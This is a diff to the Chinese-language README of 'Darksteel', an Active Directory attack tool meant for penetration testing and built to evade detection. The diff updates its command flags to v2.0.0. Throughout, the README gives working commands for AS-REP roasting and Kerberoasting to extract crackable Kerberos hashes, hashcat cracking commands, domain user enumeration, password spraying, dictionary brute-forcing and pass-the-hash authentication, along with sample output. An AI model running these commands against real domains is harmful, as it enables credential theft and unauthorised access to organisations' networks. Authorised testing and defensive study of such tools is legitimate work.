@@ -5,40 +5,28 @@
 # 介绍
 Darksteel是一款域内自动化信息搜集并利用的工具。在渗透时发现单独搜集域内信息比较繁琐，漏洞利用也需要很多工具，所以完成此项目，帮助我解决域内信息搜集繁琐问题以及漏洞利用问题。此项目以规避检测为主要目的完成，直接对域控进行攻击的利用没有做，因为如果有设备会产生大量的告警，后续可能会添加bypass检测的利用。
 ### 新功能演示
-查询acl权限功能目前只能在windows中使用。
+新增可不填写账号密码使用本地账号进行认证查询（-d参数需要填写域名）
+
 ```
-darksteel.exe computerip -dc 192.168.1.1 -domain test.com -file 123.txt
+darksteel.exe ldap -d dc.domain.com -n domain.com -m computer
  ____    ______  ____    __  __   ____    ______  ____    ____    __
 /\  _`\ /\  _  \/\  _`\ /\ \/\ \ /\  _`\ /\__  _\/\  _`\ /\  _`\ /\ \
 \ \ \/\ \ \ \L\ \ \ \L\ \ \ \/'/'\ \,\L\_\/_/\ \/\ \ \L\_\ \ \L\_\ \ \
- \ \ \ \ \ \  __ \ \ ,  /\ \ , <  \/_\__ \  \ \ \ \ \  _\L\ \  _\L\ \ \  _
-  \ \ \_\ \ \ \/\ \ \ \\ \\ \ \\`\  /\ \L\ \ \ \ \ \ \ \L\ \ \ \L\ \ \ \L\ \
-   \ \____/\ \_\ \_\ \_\ \_\ \_\ \_\\ `\____\ \ \_\ \ \____/\ \____/\ \____/
-    \/___/  \/_/\/_/\/_/\/ /\/_/\/_/ \/_____/  \/_/  \/___/  \/___/  \/___/
+\ \ \ \ \ \  __ \ \ ,  /\ \ , <  \/_\__ \  \ \ \ \ \  _\L\ \  _\L\ \ \  _
+\ \ \_\ \ \ \/\ \ \ \\ \\ \ \\`\  /\ \L\ \ \ \ \ \ \ \L\ \ \ \L\ \ \ \L\ \
+\ \____/\ \_\ \_\ \_\ \_\ \_\ \_\\ `\____\ \ \_\ \ \____/\ \____/\ \____/
+\/___/  \/_/\/_/\/_/\/ /\/_/\/_/ \/_____/  \/_/  \/___/  \/___/  \/___/
 
-   v1.0.8
+v2.0.0
 
-[*] Computer correspondence iP:
-        WIN-KQH5FQSIJSH  ————> A: 192.168.1.46
-        DESKTOP-AO8D722  ————> A: 192.168.1.121
-        
-
-darksteel.exe ldap -dc 192.168.1.1 -domain test.com -user user -pass password(hash) -m sddl
- ____    ______  ____    __  __   ____    ______  ____    ____    __
-/\  _`\ /\  _  \/\  _`\ /\ \/\ \ /\  _`\ /\__  _\/\  _`\ /\  _`\ /\ \
-\ \ \/\ \ \ \L\ \ \ \L\ \ \ \/'/'\ \,\L\_\/_/\ \/\ \ \L\_\ \ \L\_\ \ \
- \ \ \ \ \ \  __ \ \ ,  /\ \ , <  \/_\__ \  \ \ \ \ \  _\L\ \  _\L\ \ \  _
-  \ \ \_\ \ \ \/\ \ \ \\ \\ \ \\`\  /\ \L\ \ \ \ \ \ \ \L\ \ \ \L\ \ \ \L\ \
-   \ \____/\ \_\ \_\ \_\ \_\ \_\ \_\\ `\____\ \ \_\ \ \____/\ \____/\ \____/
-    \/___/  \/_/\/_/\/_/\/ /\/_/\/_/ \/_____/  \/_/  \/___/  \/___/  \/___/
-
-   v1.0.8
-
-[*] Acl :
-        qt 完全控制 ------> ac
-        qt 修改密码 ------> zz
-        qt01 拥有DCSync权限
+[*] Domain Computers:
+WIN-KQH5FQSIJSH
+DESKTOP-AO8D722
+DESKTOP-DO7D913
+WIN-7UI852PL
+EXCHANGESERVER
 ```
+
 ### 项目主要功能
 
 ```
@@ -64,169 +52,37 @@ computerip
    \ \____/\ \_\ \_\ \_\ \_\ \_\ \_\\ `\____\ \ \_\ \ \____/\ \____/\ \____/
     \/___/  \/_/\/_/\/_/\/ /\/_/\/_/ \/_____/  \/_/  \/___/  \/___/  \/___/
 
-   v1.0.8
+   v2.0.0
 
-Available Commands:
-  darksteel ldap [parameter]
-  darksteel kerberos [parameter]
-  darksteel blast [parameter]
-  darksteel computerip [parameter]
+kerberos利用
 
-ldap Interact with LDAP server
-  -all
-        Query all content
-  -dc string
-        * Please enter the IP of the domain control
-  -domain string
-        * Please enter the domain name
-  -f string
-        Customize the field of LDAP
-  -fuzz string
-        vague query content
-  -ldapSizeLimit int
-        Query LDAP maximum number (default 0)
-  -m string
-        user
-          Query all users in the domain
-        computer
-          Query all computers in the domain
-        scomputer
-          Query survival computer
-        dc
-          Query all domain controls in the domain
-        spn
-          Query all SPN in the domain
-        ou
-          All OU in the query domain
-        mssql
-          Query all mssql services in the domain
-        asreproast
-          Query users in the domain who can use as-rep roast
-        maq
-          Query the value of maq in the domain
-        admins
-          Query domain admins
-        enterprise
-          Query enterprise admins
-        exchangecomputer
-          Query exchange computers
-        exchangesystem
-          Query Exchange Trusted Subsystem
-        exchangeorgmanager
-          Query Exchange Organization Management
-        trustdomain
-          Query Trust Domain
-        adminsdholder
-          Query the user whose permission is set for AdminSDHolder
-        sidhistory
-          Query the users who have set SIDHistory
-        cacomputer
-          Query adcs
-        esc1
-          Template that is threatened by esc1
-        esc2
-          Template that is threatened by esc2
-        computerip
-          Query the ip address of the computer in the domain
-        sddl
-          Query misconfigured acl
-  -n string
-        The field to query, you can write multiple
-  -o string
-        Output file position, default current directory
-  -pass string
-        * The corresponding password or hash user
-  -user string
-        * Username in the domain
-  -w string
-        all
-          all delegate information
-        uw
-          unconstrained delegation information
-        cw
-          Constraint appointment information
-        bw
-          Resource-based constraint delegation
+Usage:
+  darksteel kerberos [flags]
 
-kerberos Do some Kerberos stuff
-  -dc string
-        * Please enter the IP of the domain control
-  -domain string
-        * Please enter the domain name
-  -enctype string
-        enctype Encryption type: rc4, aes128 or aes256 (default "rc4")
-  -format string
-        format Output hash as John the Ripper or Hashcat format (default "hashcat")
-  -ldapsizelimit int
-        Query LDAP maximum number (default 0)
-  -m string
-        asreproast
-          as-rep roast attack
-        kerberoast
-          kerberoasting attack
-  -o string
-        Output file position, default current directory
-  -pass string
-        * The corresponding password or hash user
-  -ticket string
-        Using ticket authentication, enter the path of the ticket
-  -tuser string
-        Enter the user to be utilized
-  -user string
-        * Username in the domain
+Flags:
+  -e, --enctype string       加密类型：RC4、AES128、AES256 (default "rc4")
+  -f, --format string        输出格式为John the Ripper 或 Hashcat 可利用格式 (de
+fault "hashcat")
+  -h, --help                 help for kerberos
+  -l, --ldapSizelimit int    查询LDAP最大数目（默认为0）
+  -p, --pass string          对应的密码或哈希用户
+  -m, --roastmodule string   asreproast
+                               as-rep roast利用
+                             kerberoast
+                               kerberoasting利用
+  -t, --targetuser string    脆弱易攻击的用户
+  -k, --ticket string        使用票证认证时，输入票证的路径
+  -u, --user string          域内的用户名
 
-blast Blasting Domain User
-  -dc string
-        * Please enter the IP of the domain control
-  -domain string
-        * Please enter the domain name
-  -m string
-        userenum -userfile user.txt
-          User enumeration
-        passspray -userfile user.txt -pass password
-          Password spraying
-        blastpass -user username -passfile password.txt
-          Single user burst password
-        userpass -upfile userpass.txt
-          User password combinations explode
-  -o string
-        Output file position, default current directory
-  -pass string
-        Password in the domain
-  -passfile string
-        Password dictionary
-  -t int
-        Number of burst threads (default 20)
-  -upfile string
-        The dictionary corresponding to the user name and password is split by:
-  -user string
-        Username in the domain
-  -userfile string
-        User dictionary
-  -v    Whether a failure message is displayed
-
-computerip Query the ip address of the computer in the domain
-  -dc string
-        * Please enter the IP of the domain control
-  -domain string
-        * Please enter the domain name
-  -file string
-        Query the list of machine's corresponding IP addresses
-  -ldapSizeLimit int
-        Query LDAP maximum number (default 0)
-  -o string
-        Output file position, default current directory
-  -pass string
-        * Password in the domain
-  -user string
-        * Username in the domain
-
+Global Flags:
+  -d, --dc string       域控地址
+  -n, --domain string   域名
 ```
 # 使用实例
 ## Ldap
 ##### 1、当我们拥有一个域内账号密码(hash)，可以通过ldap进行搜集域内有用信息，如spn、委派、存活计算机等等信息，为域渗透进行准备
 ```
-darksteel.exe ldap -domain test.com -dc 192.168.1.1 -user user -pass password(hash) -all
+darksteel.exe ldap -n test.com -d 192.168.1.1 -u user -p password(hash) -a
  ____    ______  ____    __  __   ____    ______  ____    ____    __       
 /\  _`\ /\  _  \/\  _`\ /\ \/\ \ /\  _`\ /\__  _\/\  _`\ /\  _`\ /\ \      
 \ \ \/\ \ \ \L\ \ \ \L\ \ \ \/'/'\ \,\L\_\/_/\ \/\ \ \L\_\ \ \L\_\ \ \    
@@ -235,7 +91,7 @@ darksteel.exe ldap -domain test.com -dc 192.168.1.1 -user user -pass password(ha
    \ \____/\ \_\ \_\ \_\ \_\ \_\ \_\\ `\____\ \ \_\ \ \____/\ \____/\ \____/  
     \/___/  \/_/\/_/\/_/\/ /\/_/\/_/ \/_____/  \/_/  \/___/  \/___/  \/___/   
     
-   v1.0.8
+   v2.0.0
 
 
 [*] Domain User:
@@ -427,7 +283,7 @@ darksteel.exe ldap -domain test.com -dc 192.168.1.1 -user user -pass password(ha
 
 ##### 2、当我们想要查找域内某些关键字对应的user或者computer时可以使用关键字查询，来找到哪些是管理员user和管理员computer
 ```
-darksteel.exe ldap -domain test.com -dc 192.168.1.1 -user user -pass password(hash) -fuzz 管理员
+darksteel.exe ldap -n test.com -d 192.168.1.1 -u user -p password(hash) -z 管理员
  ____    ______  ____    __  __   ____    ______  ____    ____    __       
 /\  _`\ /\  _  \/\  _`\ /\ \/\ \ /\  _`\ /\__  _\/\  _`\ /\  _`\ /\ \      
 \ \ \/\ \ \ \L\ \ \ \L\ \ \ \/'/'\ \,\L\_\/_/\ \/\ \ \L\_\ \ \L\_\ \ \    
@@ -447,7 +303,7 @@ darksteel.exe ldap -domain test.com -dc 192.168.1.1 -user user -pass password(ha
 
 ##### 3、如果想查询的内容工具内没有写到也可以使用ldap语法进行查询
 ```
-darksteel.exe ldap -domain test.com -dc 192.168.1.1 -user user -pass password(hash) -f "(objectClass=Computer)" -n cn,dNSHostName
+darksteel.exe ldap -n test.com -d 192.168.1.1 -u user -p password(hash) -f "(objectClass=Computer)" -t cn,dNSHostName
  ____    ______  ____    __  __   ____    ______  ____    ____    __       
 /\  _`\ /\  _  \/\  _`\ /\ \/\ \ /\  _`\ /\__  _\/\  _`\ /\  _`\ /\ \      
 \ \ \/\ \ \ \L\ \ \ \L\ \ \ \/'/'\ \,\L\_\/_/\ \/\ \ \L\_\ \ \L\_\ \ \    
@@ -476,7 +332,7 @@ dNSHostName: [WIN-7UI852PL.test.com]
 ##### 1、利用kerberos不需要域认证对用户密钥进行获取，可选择输出hashcat或john爆破格式（默认为hashcat）爆破出来的密码则为该用户的密码，如果不指定目标用户则需要一个域用户账号密码进行ldap查询并输出所有可利用密钥。hashcat爆破命令：hashcat -m 18200 hash.txt pass.txt --force
 
 ```
-darksteel.exe kerberos -m asreproast -dc 192.168.1.1 -domain test.com -user user -pass password(hash)
+darksteel.exe kerberos -m asreproast -d 192.168.1.1 -n test.com -u user -p password(hash)
  ____    ______  ____    __  __   ____    ______  ____    ____    __       
 /\  _`\ /\  _  \/\  _`\ /\ \/\ \ /\  _`\ /\__  _\/\  _`\ /\  _`\ /\ \      
 \ \ \/\ \ \ \L\ \ \ \L\ \ \ \/'/'\ \,\L\_\/_/\ \/\ \ \L\_\ \ \L\_\ \ \    
@@ -505,7 +361,7 @@ a862d700499c6a7791e4fd17228a9adc5db5ebbe6e69d59bcde7f7e3fd3751ba54eda6339cb87b69
 ##### 2、指定目标用户，则不需要域用户认证
 
 ```
-darksteel.exe kerberos  -m asreproast -dc 192.168.1.1 -domain test.com -tuser zz
+darksteel.exe kerberos -m asreproast -d 192.168.1.1 -n test.com -t zz
  ____    ______  ____    __  __   ____    ______  ____    ____    __       
 /\  _`\ /\  _  \/\  _`\ /\ \/\ \ /\  _`\ /\__  _\/\  _`\ /\  _`\ /\ \      
 \ \ \/\ \ \ \L\ \ \ \L\ \ \ \/'/'\ \,\L\_\/_/\ \/\ \ \L\_\ \ \L\_\ \ \    
@@ -532,7 +388,7 @@ a862d700499c6a7791e4fd17228a9adc5db5ebbe6e69d59bcde7f7e3fd3751ba54eda6339cb87b69
 ##### 3、如果目标将用户设置了spn后，则可以将密钥输出，可选择输出hashcat或john爆破格式（默认为hashcat）爆破出来的密码则为该用户的密码，如果不指定目标用户则需要一个域用户账号密码进行ldap查询并输出所有可利用密钥。hashcat爆破命令：hashcat -m 13100 hash.txt pass.txt --force
 
 ```
-darksteel.exe kerberos -m kerberoast -dc 192.168.1.1 -domain test.com -user user -pass password(hash) 
+darksteel.exe kerberos -m kerberoast -d 192.168.1.1 -n test.com -u user -p password(hash) 
  ____    ______  ____    __  __   ____    ______  ____    ____    __       
 /\  _`\ /\  _  \/\  _`\ /\ \/\ \ /\  _`\ /\__  _\/\  _`\ /\  _`\ /\ \      
 \ \ \/\ \ \ \L\ \ \ \L\ \ \ \/'/'\ \,\L\_\/_/\ \/\ \ \L\_\ \ \L\_\ \ \    
@@ -587,7 +443,7 @@ f7aeb47dc601826d6643f95c33c7d388a3120b08ed2864e0c0bdacfb41594cea5d286583ed2fd520
 ##### 1、当我们找到域但还没有域用户的时候可以使用域用户枚举进行枚举域用户。想要输出失败信息可以使用-v参数
 
 ```
-darksteel.exe blast -m userenum -dc 192.168.1.1 -domain test.com -userfile users.txt
+darksteel.exe blast -m userenum -d 192.168.1.1 -n test.com -U users.txt
  ____    ______  ____    __  __   ____    ______  ____    ____    __       
 /\  _`\ /\  _  \/\  _`\ /\ \/\ \ /\  _`\ /\__  _\/\  _`\ /\  _`\ /\ \      
 \ \ \/\ \ \ \L\ \ \ \L\ \ \ \/'/'\ \,\L\_\/_/\ \/\ \ \L\_\ \ \L\_\ \ \    
@@ -605,7 +461,7 @@ Done! Tested logins in 0.034 seconds
 
 
 
-darksteel.exe blast -m userenum -dc 192.168.1.1 -domain test.com -userfile users.txt -v
+darksteel.exe blast -m userenum -d 192.168.1.1 -n test.com -U users.txt -v
  ____    ______  ____    __  __   ____    ______  ____    ____    __       
 /\  _`\ /\  _  \/\  _`\ /\ \/\ \ /\  _`\ /\__  _\/\  _`\ /\  _`\ /\ \      
 \ \ \/\ \ \ \L\ \ \ \L\ \ \ \/'/'\ \,\L\_\/_/\ \/\ \ \L\_\ \ \L\_\ \ \    
@@ -626,7 +482,7 @@ Done! Tested logins in 0.002 seconds
 
 ##### 2、找到用户后使用单个密码进行爆破
 ```
-darksteel.exe blast -m passspray -dc 192.168.1.1 -domain test.com -userfile users.txt -pass 123456
+darksteel.exe blast -m passspray -d 192.168.1.1 -n test.com -U users.txt -p 123456
  ____    ______  ____    __  __   ____    ______  ____    ____    __       
 /\  _`\ /\  _  \/\  _`\ /\ \/\ \ /\  _`\ /\__  _\/\  _`\ /\  _`\ /\ \      
 \ \ \/\ \ \ \L\ \ \ \L\ \ \ \/'/'\ \,\L\_\/_/\ \/\ \ \L\_\ \ \L\_\ \ \    
@@ -645,7 +501,7 @@ Done! Tested logins in 0.024 seconds
 ##### 3、使用密码字典爆破单个用户
 
 ```
-darksteel.exe blast -m blastpass -dc 192.168.1.1 -domain test.com -user zz -passfile pass.txt
+darksteel.exe blast -m blastpass -d 192.168.1.1 -n test.com -u zz -P pass.txt
  ____    ______  ____    __  __   ____    ______  ____    ____    __       
 /\  _`\ /\  _  \/\  _`\ /\ \/\ \ /\  _`\ /\__  _\/\  _`\ /\  _`\ /\ \      
 \ \ \/\ \ \ \L\ \ \ \L\ \ \ \/'/'\ \,\L\_\/_/\ \/\ \ \L\_\ \ \L\_\ \ \    
@@ -664,7 +520,7 @@ Done! Tested logins in 0.013 seconds
 ##### 4、使用用户名密码对应字典爆破
 
 ```
-darksteel.exe blast -m userpass -dc 192.168.1.1 -test.com -upfile userpass.txt
+darksteel.exe blast -m userpass -d 192.168.1.1 -n test.com -F userpass.txt
  ____    ______  ____    __  __   ____    ______  ____    ____    __       
 /\  _`\ /\  _  \/\  _`\ /\ \/\ \ /\  _`\ /\__  _\/\  _`\ /\  _`\ /\ \      
 \ \ \/\ \ \ \L\ \ \ \L\ \ \ \/'/'\ \,\L\_\/_/\ \/\ \ \L\_\ \ \L\_\ \ \    
@@ -685,25 +541,25 @@ Done! Tested logins in 0.010 seconds
 
 ##### 支持密码为hash
 ```
-darksteel ldap -dc 192.168.1.1 -domain test.com -user administrator -pass hash 
+darksteel ldap -d 192.168.1.1 -n test.com -u administrator -p hash 
 ```
 
 ##### 查询域内单条内容 -m指定
 
 ```
-darksteel ldap -dc 192.168.1.1 -domain test.com -user administrator -pass 123456 -m computer
+darksteel ldap -d 192.168.1.1 -n test.com -u administrator -p 123456 -m computer
 ```
 ##### 查询所有委派信息 -w指定
 
 ```
-darksteel ldap -dc 192.168.1.1 -domain test.com -user administrator -pass 123456 -w all
+darksteel ldap -d 192.168.1.1 -n test.com -u administrator -p 123456 -w all
 ```
 #### 可选择参数
 
 ```
 -o                  保存文件（不包括自定义查询）
 
--ldapsizelimit      最大查询数（默认所有）
+-l                  最大查询数（默认所有）
 
 -m                  指定单独查询内容
 
@@ -717,18 +573,18 @@ darksteel ldap -dc 192.168.1.1 -domain test.com -user administrator -pass 123456
 ##### 利用所有用户并输出
 
 ```
-darksteel kerberos -dc 192.168.1.1 -domain test.com -user administrator -pass 123 -m kerberoast
+darksteel kerberos -d 192.168.1.1 -n test.com -u administrator -p 123 -m kerberoast
 ```
 ##### 利用指定test用户并输出
 
 ```
-darksteel kerberos -dc 192.168.1.1 -domain test.com -user administrator -pass 123 -m kerberoast -tuser test
+darksteel kerberos -d 192.168.1.1 -n test.com -u administrator -p 123 -m kerberoast -t test
 ```
 
 ##### 使用TGT进行认证（只可利用单用户）
 
 ```
-darksteel kerberos -dc 192.168.1.1 -ticket 123.kirbi -m kerberoast -tuser test
+darksteel kerberos -d 192.168.1.1 -k 123.kirbi -m kerberoast -t test
 ```
 
 ##### asreproast（支持密码为hash）
@@ -736,24 +592,24 @@ darksteel kerberos -dc 192.168.1.1 -ticket 123.kirbi -m kerberoast -tuser test
 ##### 利用所有用户并输出
 
 ```
-darksteel kerberos -dc 192.168.1.1 -domain test.com -user administrator -pass 123 -m asreproast
+darksteel kerberos -d 192.168.1.1 -n test.com -u administrator -p 123 -m asreproast
 ```
 
 ##### 利用指定test用户并输出
 
 ```
-darksteel kerberos -dc 192.168.1.1 -domain test.com  -m asreproast -tuser test
+darksteel kerberos -d 192.168.1.1 -n test.com  -m asreproast -t test
 ```
 #### 可选择参数
 
 ```
 -o                  保存文件（不包括自定义查询）
 
--ldapsizelimit      最大查询数（默认所有）
+-l                  最大查询数（默认所有）
 
--enctype            选择加密方式（默认rc4）
+-e                  选择加密方式（默认rc4）
 
--format             选择输出爆破格式（默认hashcat）
+-f                  选择输出爆破格式（默认hashcat）
 ```
 
 ## blast
@@ -761,24 +617,24 @@ darksteel kerberos -dc 192.168.1.1 -domain test.com  -m asreproast -tuser test
 ##### 域用户枚举
 
 ```
-darksteel blast -m userenum -dc 192.168.1.1 -domain test.com -userfile user.txt
+darksteel blast -m userenum -d 192.168.1.1 -n test.com -U user.txt
 ```
 ##### 密码喷洒
 
 ```
-darksteel blast -m passspray -dc 192.168.1.1 -domain test.com -userfile user.txt -pass 123456
+darksteel blast -m passspray -d 192.168.1.1 -n test.com -U user.txt -p 123456
 ```
 
 ##### 单用户密码爆破
 
 ```
-darksteel blast -m blastpass -dc 192.168.1.1 -domain test.com -user admin -passfile password.txt
+darksteel blast -m blastpass -d 192.168.1.1 -n test.com -u admin -P password.txt
 ```
 
 ##### 用户对应密码爆破（字典格式 admin:123456）
 
 ```
-darksteel blast -m userpass -dc 192.168.1.1 -domain test.com -upfile userpassword.txt
+darksteel blast -m userpass -d 192.168.1.1 -n test.com -F userpassword.txt
 ```
 
 #### 可选择参数
